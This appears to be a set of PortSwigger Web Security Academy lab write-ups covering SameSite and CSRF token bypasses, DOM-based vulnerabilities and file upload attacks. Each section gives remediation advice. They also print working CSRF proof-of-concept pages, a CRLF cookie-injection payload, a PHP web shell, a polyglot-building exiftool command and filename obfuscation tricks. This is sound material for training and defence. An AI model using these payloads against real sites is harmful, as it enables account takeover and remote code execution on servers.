1. Lax-plus-POST (the two-minute window). When a cookie is set without an explicit SameSite attribute, Chrome defaults it to Lax but adds an exception: for the first 120 seconds after the cookie is issued, it is also sent on top-level cross-site POST requests. If the CSRF fires inside that window, a cross-site POST still carries the cookie.
  2. Cookie refresh via OAuth. Completing (or silently re-completing) the OAuth flow re-issues the session cookie. If an attacker can force the victim's browser to quietly run the OAuth login again, the 120-second clock resets on demand.

Chaining them: trigger an OAuth cookie refresh, then immediately submit the cross-site POST while the fresh cookie is still inside its Lax-plus-POST window.

docs.title: 1. Observe the OAuth login refreshes the cookie
docs.text: Log in with wiener:peter. The login goes through the OAuth flow and, because you already have an OAuth session, completing it again does not prompt for consent — it just re-issues a new session cookie. That silent completion is the refresh primitive.

docs.title: 2. Build the exploit
docs.text:
The exploit does two things in order: force a background OAuth completion (to refresh the cookie), then auto-submit the change-email POST. A simple approach loads the OAuth login endpoint, then after a short delay submits the CSRF form:

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="csrf@attacker.com" />
</form>
<script>
  // 1. Refresh the session cookie by silently re-running OAuth login.
  window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
  // 2. After the cookie is re-issued, fire the cross-site POST within the
  //    120s Lax-plus-POST window.
  setTimeout(() => document.forms[0].submit(), 5000);
</script>

docs.title: 3. Deliver and solve
docs.text: Deliver the exploit to the victim. Their browser refreshes the session cookie through OAuth, and the subsequent top-level POST is accepted because the fresh cookie is still within the Lax-plus-POST window. The victim's email changes and the lab is solved.

docs.title: Why the attack works
docs.text: SameSite=Lax (the browser default) is not absolute: the Lax-plus-POST exception leaves a short window where cross-site POSTs still send the cookie, and an OAuth re-login lets the attacker reopen that window at will.

docs.title: Remediation
docs.text: Set SameSite=Strict (or Lax with an explicit, server-set value and no reliance on the default window) on session cookies, and protect state-changing actions with an anti-CSRF token. Do not treat a silent OAuth completion as sufficient proof of user intent.

docs.title: SameSite Lax bypass via method override
docs.text:
Lab: PortSwigger Web Security Academy — SameSite Lax bypass via method override (Practitioner).

The change-email function is vulnerable to CSRF. Perform a CSRF attack that changes the victim's email, hosted on the exploit server. Credentials: wiener:peter.

docs.title: The flaw class: method override under Lax
docs.text:
SameSite=Lax sends the session cookie cross-site only on a top-level GET navigation, not on a cross-site POST. That normally blocks a POST-based CSRF. But many frameworks (Symfony, Rails, Laravel, Express with method-override) let a client override the HTTP method via a parameter such as _method. The real request is a GET — which Lax does allow to carry the cookie — but the server treats it as a POST because of _method=POST.

So the attacker sends a Lax-friendly GET that the server executes as the protected POST:

/my-account/change-email?email=attacker@evil.net&_method=POST

docs.title: 1. Confirm the override works
docs.text: Log in as wiener and capture the change-email POST. In Repeater, convert it to a GET with the parameters in the query string and add _method=POST. The server performs the email change — the override is honoured.

docs.title: 2. Build the exploit
docs.text:
Because the attack must be a top-level navigation (so Lax sends the cookie), a simple document.location redirect to the GET URL is enough — no form, no POST:

<html>
  <body>
    <script>
      document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=doo@web-security-academy.net&_method=POST";
    </script>
  </body>
</html>

docs.title: 3. Deliver it
docs.text: Host it on the exploit server and deliver it. The victim's browser performs a top-level GET navigation (cookie attached under Lax), and the server, seeing _method=POST, runs the email change.

docs.title: Why the attack works
docs.text: Lax reasons about the wire method (GET), while the application reasons about the overridden method (POST). The gap between those two views lets a cookie that should never ride a POST do exactly that.

docs.title: Remediation
docs.text: Do not honour method-override parameters on authenticated, state-changing endpoints. Add a session-bound CSRF token so the method no longer matters, and prefer SameSite=Strict where cross-site navigation into the action is never legitimate.

docs.title: SameSite Strict bypass via client-side redirect
docs.text:
Lab: PortSwigger Web Security Academy — SameSite Strict bypass via client-side redirect.

The change-email function is vulnerable to CSRF. Solve it by performing a CSRF attack that changes the victim's email address, using the provided exploit server. Credentials: wiener:peter.

docs.title: Why Strict normally blocks this
docs.text:
SameSite=Strict tells the browser to send the cookie only when the request originates from the same site. A form auto-submitted from the attacker's exploit server is cross-site, so the session cookie is withheld and the change-email request fails.

The way around it is to not send the final request cross-site at all. If the application contains a client-side redirect whose destination you can influence, you can aim a cross-site request at that redirect; the browser then issues the real request as a same-site navigation, and the Strict cookie rides along.

docs.title: 1. Find the on-site redirect gadget
docs.text:
After posting a comment, the application sends the browser to a confirmation endpoint that performs a client-side redirect based on the postId parameter:

GET /post/comment/confirmation?postId=<id>

The redirect builds a URL from postId without validating it, so a value like ../my-account/change-email?email=... makes the browser redirect to the sensitive endpoint — on the same origin.

docs.title: 2. Build the PoC
docs.text:
Host this on the exploit server. The outer request targets the confirmation endpoint (the gadget); its postId traverses back to the change-email action:

<html>
  <!-- CSRF PoC -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation">
      <input type="hidden" name="postId"
             value="../my-account/change-email?email=csrf@attacker.com&submit=1" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

The initial hit on /post/comment/confirmation is cross-site (no cookie needed there), but the redirect it triggers to /my-account/change-email is same-site, so the browser attaches the SameSite=Strict session cookie to it.

docs.title: 3. Deliver and solve
docs.text: Store the exploit and deliver it to the victim. Their browser follows the client-side redirect, the change-email request is sent same-site with their cookie, and the email changes:

docs.title: Why the attack works
docs.text: SameSite=Strict only inspects the origin of the request it is attached to. By laundering the sensitive request through an application-controlled client-side redirect, the final navigation is same-site, so Strict never engages. The root cause is an open client-side redirect (unvalidated postId).

docs.title: Remediation
docs.text: Validate redirect targets against an allow-list so postId cannot be coerced into an arbitrary path, and protect state-changing actions with an unpredictable anti-CSRF token rather than relying on SameSite alone.

docs.title: CSRF where token is duplicated in cookie (double submit)
docs.text:
Lab: PortSwigger Web Security Academy — CSRF where token is duplicated in cookie (Practitioner).

The email-change functionality uses the insecure "double submit" CSRF prevention technique. Host an HTML page on the exploit server that changes the viewer's email. Credentials: wiener:peter.

docs.title: The flaw class: insecure "double submit"
docs.text:
The double-submit pattern sends the same token twice — once as a cookie, once as a request parameter — and the server simply checks that the two are equal. Crucially, the server keeps no record of the token; it never verifies the token is legitimate, only that the cookie copy and the parameter copy match.

That is trivially satisfiable if the attacker can set the cookie. They pick any value fake, set the victim's csrf cookie to fake, and submit csrf=fake in the form. Cookie equals parameter, so validation passes — the value never had to be a real server-issued token. As in the non-session-cookie lab, this needs a cookie-setting primitive, supplied here by the reflected Set-Cookie search gadget.

docs.title: 1. Confirm the equality-only check
docs.text: Log in as wiener, capture a change-email request, and send it to Repeater. Change the csrf cookie and the csrf body parameter to the same arbitrary value (e.g. fake). The request still succeeds, proving the server only compares the two for equality.

docs.title: 2. Build the exploit
docs.text:
The page injects a known csrf cookie with the search/header-injection gadget, then auto-submits a form whose csrf parameter is the same value:

<html>
  <body>
    <!-- Form to change the victim's email -->
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>

    <!-- Inject a matching csrf cookie, then submit on error -->
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
         onerror="document.forms[0].submit()" />
  </body>
</html>

docs.title: 3. Deliver it
docs.text: Host it on the exploit server and deliver it to the victim. The cookie and parameter both read fake, the equality check passes, and the email changes.

docs.title: Why the attack works
docs.text: Double-submit assumes an attacker cannot set the victim's cookie. The moment a cookie-injection primitive exists on the site, the attacker controls both sides of the equality check and can make them match with any value, real token or not.

docs.title: Remediation
docs.text: Do not rely on comparing a cookie to a parameter. Use a token that is stored server-side and bound to the session, or cryptographically sign the double-submit token so it cannot be forged. Also remove the header/cookie-injection gadget.

docs.title: CSRF where token is not tied to user session
docs.text:
Lab: PortSwigger Web Security Academy — CSRF where token is not tied to user session (Practitioner).

The email-change functionality uses CSRF tokens, but they are not integrated into the session handling system. Host an HTML page on the exploit server that changes the viewer's email. Accounts: wiener:peter and carlos:montoya.

docs.title: The flaw class: session independence
docs.text:
A CSRF token only defends anything if it is bound to the user's session. If the server keeps a global pool of valid tokens and accepts any token from that pool regardless of whose session it was issued to, the protection collapses: an attacker can obtain a perfectly valid token from their own account and embed it in a request aimed at the victim.

  1. Attacker logs in, captures a valid csrf token from their session.
  2. Attacker puts that token in the forged request.
  3. Victim submits it; the server sees a token that exists in the pool and accepts it.

docs.title: 1. Confirm tokens are interchangeable
docs.text: Log in as wiener, capture a change-email request and its csrf token. Drop it to Repeater. Then log in as carlos in a second session and capture that request too. Swap wiener's token into carlos's request (keeping carlos's session cookie) — it still succeeds. The token is not tied to the session.

docs.title: 2. Mint a fresh token for the exploit
docs.text:
Load the change-email form in your own account and copy a currently-valid token. Build the PoC using that token as a hidden field:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="A-VALID-TOKEN-FROM-YOUR-SESSION" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

docs.title: 3. Deliver it
docs.text:
Deliver the exploit. The victim's browser submits the form; the server accepts the attacker-supplied token because it is globally valid.

Tokens can expire

Because the token is not bound to the victim, it only has to be valid at the moment the victim submits it. If the lab expires tokens, mint a fresh one just before delivering.

docs.title: Why the attack works
docs.text: The token proves "a token was issued by this server", not "this request belongs to this session". Any valid token therefore satisfies the check, and attackers can issue themselves valid tokens at will.

docs.title: Remediation
docs.text: Tie every CSRF token cryptographically to the session it was issued for (or store a per-session token server-side) and reject a token that belongs to a different session.

docs.title: CSRF where token is tied to a non-session cookie
docs.text:
Lab: PortSwigger Web Security Academy — CSRF where token is tied to a non-session cookie (Practitioner).

The email-change functionality uses CSRF tokens, but they aren't fully integrated into the session handling system. Host an HTML page on the exploit server that changes the viewer's email. Accounts: wiener:peter and carlos:montoya.

docs.title: The flaw class: token bound to the wrong cookie
docs.text:
Here the application does tie the token to a cookie — but to a separate csrfKey cookie, not the session cookie. Session management and CSRF protection are handled by two different components that never cross-check each other:

  • session=... authenticates the user.
  • csrfKey=... is what the CSRF token is validated against.

The validation only asks "does the submitted token match the csrfKey cookie?" — never "does this csrfKey belong to this session?". So if the attacker can set the victim's csrfKey cookie to a value they control, they can pair it with a matching token they generated and the check passes. The attack needs a cookie-setting primitive elsewhere on the site; this lab provides one via a search function that reflects input into a Set-Cookie header (CRLF/header injection).

docs.title: 1. Harvest a matching csrfKey + token pair
docs.text:
Log in as wiener, open the change-email form, and in Burp capture both:

  • the csrfKey cookie value, and
  • the csrf token in the request body (they are a valid pair).

docs.title: 2. Find the cookie-injection gadget
docs.text:
The search function reflects the query into a Set-Cookie header. A payload containing a URL-encoded CRLF (%0d%0a) lets you inject an arbitrary cookie:

/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None

Loading that URL sets csrfKey in the visitor's browser.

docs.title: 3. Chain injection + CSRF in one page
docs.text:
The exploit first forces the victim's browser to accept the attacker's csrfKey (via an <img> pointing at the injection URL), and when that image "fails" its onerror submits the change-email form carrying the matching token:

<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@evil.com" />
      <input type="hidden" name="csrf" value="YOUR-TOKEN-MATCHING-THE-KEY" />
    </form>

    <!-- Step 1: inject the attacker's csrfKey into the victim's browser -->
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"
         onerror="document.forms[0].submit()" />
  </body>
</html>

Because the submitted token matches the just-injected csrfKey, validation passes even though the victim's session cookie is their own.

docs.title: Why the attack works
docs.text: The token is validated against a cookie that is not the session cookie, and nothing links that cookie back to the session. Combined with a cookie-setting bug, the attacker controls both halves of the comparison (the cookie and the token) and makes them agree.

docs.title: Remediation
docs.text: Bind the CSRF token to the session cookie, not a separate one. Fix the header/cookie-injection primitive (never reflect user input into Set-Cookie), and set session-related cookies with HttpOnly and SameSite.

docs.title: CSRF where token validation depends on request method
docs.text:
Lab: PortSwigger Web Security Academy — CSRF where token validation depends on request method (Practitioner).

The email-change functionality is vulnerable to CSRF. It attempts to block CSRF but only applies the defence to certain request methods. Host an HTML page on the exploit server that changes the viewer's email. Credentials: wiener:peter.

docs.title: The flaw class: request-method dependency
docs.text:
Some applications validate the CSRF token only for the method they expect a form to use. A common mistake:

  • For a POST request, the token is checked.
  • For a GET request, the token check is skipped (the developer never imagined the action would be reached by GET).

If the endpoint still performs the action when reached by GET, the attacker simply switches the method and moves the parameters into the query string — no token required.

POST /email/change HTTP/1.1          ← token validated
csrf=valid_token&email=user@normal.com

GET /email/change?email=pwned@evil.com HTTP/1.1   ← no token required!

docs.title: 1. Capture the request
docs.text: Log in as wiener:peter, change the email with Burp intercepting, and send the request to Repeater. It is a POST carrying a csrf token.

docs.title: 2. Prove the method dependency
docs.text: In Repeater, use Change request method to convert the POST to GET, then remove the csrf parameter entirely. The server still accepts the request and changes the email — confirming the token is only validated for POST.

docs.title: 3. Build the exploit
docs.text:
Because the action works over GET with no token, a self-contained GET PoC is enough:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="attacker@mail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

docs.title: 4. Deliver it
docs.text: Host it on the exploit server and deliver it to the victim.

docs.title: Why the attack works
docs.text: CSRF protection must be applied consistently to every method that can perform the action. Here the defence is bound to the request method rather than to the action, so changing POST to GET side-steps it completely.

docs.title: Remediation
docs.text: Validate the CSRF token for every method that mutates state, and do not expose state-changing actions over GET at all. Reject a request whose token is missing regardless of method.

docs.title: CSRF where token validation depends on token being present
docs.text:
Lab: PortSwigger Web Security Academy — CSRF where token validation depends on token being present (Practitioner).

The email-change functionality is vulnerable to CSRF. Host an HTML page on the exploit server that changes the viewer's email. Credentials: wiener:peter.

docs.title: The flaw class: token-presence dependency
docs.text:
A subtle implementation bug: the server validates the CSRF token only when the token parameter exists. The logic is roughly "if a csrf parameter was submitted, check it; otherwise, proceed." That is different from an invalid token (which is rejected) — a missing token slips straight through.

POST /email/change            ← csrf present, validated
csrf=abc123&email=user@normal.com

POST /email/change            ← csrf absent, NOT validated
email=evil@attacker.com

The attacker does not need to guess or reproduce the token — they simply remove it.

docs.title: 1. Capture the request
docs.text: Log in as wiener:peter, submit an email change, and send the request to Repeater. Note the csrf parameter in the body.

docs.title: 2. Confirm the bug
docs.text: Replay the request with the token — it succeeds. Now delete the entire csrf parameter (not just its value) and replay. The server still accepts it. That proves validation only happens when the parameter is present.

docs.title: 3. Build and deliver the exploit
docs.text:
Because the server accepts the request with no token, a plain CSRF form that simply omits the csrf field works:

<html>
  <!-- CSRF PoC -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@mail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

Host it on the exploit server and deliver it to the victim.

docs.title: Why the attack works
docs.text: The code treats "no token supplied" as "no token to check" rather than "reject". An attacker's forged form never includes the token, so it never triggers validation.

docs.title: Remediation
docs.text: Reject any state-changing request that does not carry a valid, session-bound token. Absence of the token must be a failure, exactly like an incorrect token.

docs.title: DOM-Based Vulnerabilities
docs.text:
A DOM-based vulnerability occurs when client-side JavaScript takes attacker-controlled data from a source and passes it to a dangerous function or object (a sink) without proper validation or encoding. Because the whole flow happens in the browser, the server may never see the malicious payload — which also means it can be invisible to server-side logging and WAFs.

DOM XSS is the best-known example, but the same source-to-sink pattern produces a whole family of bugs: open redirection, cookie manipulation, client-side JavaScript injection, web-message abuse, and more.

docs.title: Taint flow: sources and sinks
docs.text:
The core mental model is taint flow — tracing a piece of attacker-influenced data from where it enters the page to where it is used:

  1. The attacker controls input through a source.
  2. JavaScript reads that data.
  3. The data is passed to a sink without validation or sanitisation.
  4. The sink processes the data in an unsafe way.
  5. A malicious action executes in the victim's browser.

Finding DOM bugs is largely about mapping these source → sink relationships in the client-side code.

docs.title: Common sources
docs.text:
A source is any property or API that can hold attacker-controllable data. Treat all of these as untrusted:

location.search       // URL query string
location.hash         // URL fragment (never sent to the server)
document.referrer     // referring URL
document.cookie       // cookies
window.name           // survives cross-origin navigation
localStorage          // persistent browser storage
sessionStorage        // per-tab browser storage
history.pushState     // state written into the history API
history.replaceState

docs.title: Common sinks
docs.text:
A sink is a function or DOM property that can produce dangerous behaviour when given attacker input:

eval()                 // executes JavaScript
document.write()       // writes markup into the parse stream
element.innerHTML      // parses HTML
window.location        // navigation / redirect
document.cookie        // cookie writes
postMessage()          // cross-document messaging
JSON.parse()           // structured data parsing
element.setAttribute() // attribute writes

docs.title: Which sink produces which vulnerability
docs.text:
Different sinks lead to different classes of DOM-based vulnerability. The sink you reach determines what you can do:

Vulnerability Representative sink DOM XSS document.write(), innerHTML, eval() Open redirection window.location Cookie manipulation document.cookie JavaScript injection eval() Document-domain manipulation document.domain WebSocket-URL poisoning WebSocket() Link manipulation element.src Web-message manipulation postMessage() AJAX header manipulation setRequestHeader() Local file-path manipulation FileReader.readAsText() Client-side SQL injection ExecuteSql() HTML5-storage manipulation sessionStorage.setItem() Client-side XPath injection document.evaluate() Client-side JSON injection JSON.parse() DOM-data manipulation element.setAttribute() Denial of service RegExp()

docs.title: DOM-based XSS
docs.text: The most severe outcome: a source flows to a sink that executes or parses code (innerHTML, document.write, eval), letting the attacker run JavaScript in the victim's session. See the dedicated Cross-Site Scripting section for worked DOM XSS labs (innerHTML, document.write, jQuery sinks, AngularJS expressions).

docs.title: DOM-based open redirection
docs.text:
The page reads a URL-derived value and assigns it to window.location, redirecting the victim to an attacker-chosen site — useful for phishing and for turning a redirect into a token-leak primitive. A weak check that only looks at the start of the string is easy to abuse:

let goto = location.hash.slice(1);
if (goto.startsWith('https:')) {
    location = goto;   // sink: attacker controls the destination
}

https://innocent-website.com/example#https://evil-user.net

Because location.hash is attacker-controlled and the prefix check is trivially satisfied, the victim is redirected off-site.

docs.title: DOM-based cookie manipulation
docs.text: The page writes a URL-derived value into document.cookie. An attacker can inject or overwrite cookie values, which can poison later application behaviour (for example, a reflected cookie value that is itself rendered unsafely) or set attacker-chosen preferences.

docs.title: DOM clobbering
docs.text: An advanced technique for pages that accept some HTML but filter obvious scripting. Injected id/name attributes create DOM elements that overwrite global variables or expected object properties, so legitimate JavaScript references the attacker's element instead of the value it expected — changing the program's behaviour without running any script directly.

docs.title: How to prevent DOM-based vulnerabilities
docs.text:
1. Keep untrusted data away from sinks. Do not pass source data directly to innerHTML, document.write, eval, location, setAttribute, and the others above.
  2. Prefer safe APIs. Use textContent instead of innerHTML; set navigation targets from an allowlist of known paths; build URLs with encodeURIComponent().
  3. Validate with allowlists. For redirects, compare against a fixed list of permitted destinations rather than checking a prefix.
  4. Apply context-specific encoding. Encode for the exact context (HTML, attribute, URL, JS) the data lands in.
  5. Audit source-to-sink flows. Review client-side code (and use tools such as browser DevTools or DOM Invader) to trace every attacker-controllable input that reaches a dangerous API.
  6. Defence in depth. A strong Content Security Policy limits the damage of a payload that slips through.

docs.title: File Upload Vulnerabilities
docs.text:
A file upload vulnerability exists when an application lets an attacker upload a file that the server will later execute as code, rather than merely store or serve as inert data. The classic target is a web shell: a small script (commonly PHP) that the attacker can request over HTTP to run arbitrary commands on the server.

The vulnerability is rarely "the upload form has no checks at all" — it is almost always that the checks the developer did add can be bypassed, because they validate the wrong thing, trust client-controlled data, or can be defeated by a crafted filename or file content.

docs.title: How uploads are supposed to work
docs.text:
Content-Type: multipart/form-data; boundary=----geckoformboundary...

------geckoformboundary...
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

<binary image data>
------geckoformboundary...

Each part of a multipart/form-data body carries its own Content-Disposition (field name, original filename) and an optional Content-Type header describing the part's MIME type. A properly defended upload feature should:

  1. Store the file outside the webroot, or in a location the web server is configured never to execute.
  2. Give it a server-generated, random name — never trust the client-supplied filename.
  3. Verify the actual content matches an allowed type (magic bytes, re-encoding/re-compression, dimension checks for images).
  4. Serve it back with a Content-Type the browser will only render, never execute.

Every lab below is a different way one or more of those controls is missing or incomplete.

docs.title: Trusting the client-supplied Content-Type
docs.text:
Many implementations check only the MIME type declared in the part's Content-Type header (e.g. image/jpeg) — a value the client fully controls and that has no relationship to the file's real content. Changing that header while keeping a PHP payload as the body is enough:

Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>

See: Web shell upload via Content-Type restriction bypass.

docs.title: Insufficient extension blacklisting
docs.text:
Blocking only the obvious executable extensions (.php, .asp, .jsp) misses the long tail of extensions a misconfigured server still executes — .php5, .phtml, .shtml, .phps, and so on. Worse, if the server honors uploaded configuration files, the attacker can widen what gets executed in the first place:

# uploaded as .htaccess
AddType application/x-httpd-php .133t

<!-- uploaded as web.config on IIS -->
<staticContent>
  <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>

Once the server trusts that configuration file, any extension the attacker chose (.133t, .myext, …) executes as PHP/ASP. See: Web shell upload via extension blacklist bypass.

docs.title: Obfuscating the extension to slip past a filter that does work
docs.text:
Even a working blacklist can be defeated by exploiting a mismatch between how the validator and the server/filesystem parse the filename:

Technique Example Why it works Case variation exploit.pHp Validation may be case-sensitive; execution isn't Double extension exploit.php.jpg Different components may key off the first or the last extension Trailing characters exploit.php., exploit.php Trailing dot/space gets silently stripped by the OS/filesystem URL encoding exploit%2Ephp Validator sees the encoded form; the server decodes it before use Null byte exploit.asp%00.jpg High-level validation code treats %00 as a terminator; low-level filesystem calls may not Unicode homoglyphs \xC0\x2E, \xC4\xAE Unicode-to-ASCII normalization changes which character ends up on disk Non-recursive strip exploit.p.phphp → strip .php once → exploit.p.php A single-pass blacklist strip leaves a dangerous extension behind

See: Web shell upload via obfuscated file extension (null byte).

docs.title: Content-based validation and its limits
docs.text:
Stronger implementations check the file's actual bytes — magic numbers (FF D8 FF for JPEG, 89 50 4E 47 for PNG, GIF89a/GIF87a for GIF) and, for images, that the file actually decodes to valid pixel dimensions. This blocks a raw .php file renamed to .jpg, but it does not block a polyglot: a file that is simultaneously a valid image and contains executable code, typically smuggled into EXIF metadata/comments with a tool like exiftool:

exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglot.php

The result still has correct JPEG magic bytes and valid image structure — it passes content validation — but the PHP code embedded in its comment runs if the server ever interprets the file as PHP. See: Remote code execution via polyglot web shell upload.

docs.title: Bypassing execution controls once the file is already stored
docs.text:
Some servers let arbitrary files be uploaded but are configured to serve/execute scripts only from specific directories (MIME-type handling scoped per directory, or per reverse-proxy backend). Two separate weaknesses are commonly chained to defeat this:

  • Path traversal in the filename field — the multipart filename is used directly to build a save path. A filename like ../rev2.php escapes the restricted upload directory and lands the executable file somewhere the server will run it.
  • Backend/reverse-proxy configuration drift — a load balancer may forward to multiple backend servers with inconsistent MIME-execution settings; finding and targeting the weaker one bypasses a control that looks airtight from the front door.

See: Web shell upload via path traversal.

docs.title: Race conditions in upload-then-validate pipelines
docs.text:
A safer framework pattern uploads to a sandboxed temp location, validates, and only then promotes the file to its final destination. Custom upload logic that instead writes straight to the final destination and validates (e.g. antivirus-scans) afterward, deleting the file if it fails, opens a race window:

  • The file is live and requestable for the (short) interval between write and delete.
  • If the temp/working filename is predictable (e.g. PHP's uniqid()-style pseudo-random names), that window can be extended by uploading a large file — slower processing gives more time to brute-force the name and request the file before it's removed.

This is a timing/architecture flaw rather than a validation bypass, and it exists specifically in custom upload implementations that skip the safer temp-directory pattern frameworks use by default.

docs.title: Why file upload RCE is high-impact
docs.text: A working web shell gives an attacker the same capabilities as any other remote code execution: reading arbitrary files (/home/carlos/secret in the labs below stands in for credentials, keys, or source in a real target), writing further files, pivoting to the internal network, and full compromise of the application server.

docs.title: Remediation
docs.text:
• Never trust client-controlled data — filename, Content-Type, and any other part header are attacker-controlled. Validate independently of all of them.
  • Validate actual file content, not just declared type: check magic bytes and, where applicable, fully decode and re-encode images rather than passing the uploaded bytes straight through (this alone defeats most polyglot metadata-injection attacks).
  • Use an allowlist of extensions, not a blacklist — blacklists are inherently incomplete and will always miss some server-recognized executable extension.
  • Generate the storage filename server-side (random, unrelated to the client-supplied name) so a crafted filename value can never influence the save path or extension.
  • Store uploads outside the webroot, or in a directory with execution explicitly and verifiably disabled (no script handlers configured for any extension, and uploaded configuration files like .htaccess/web.config rejected or ignored).
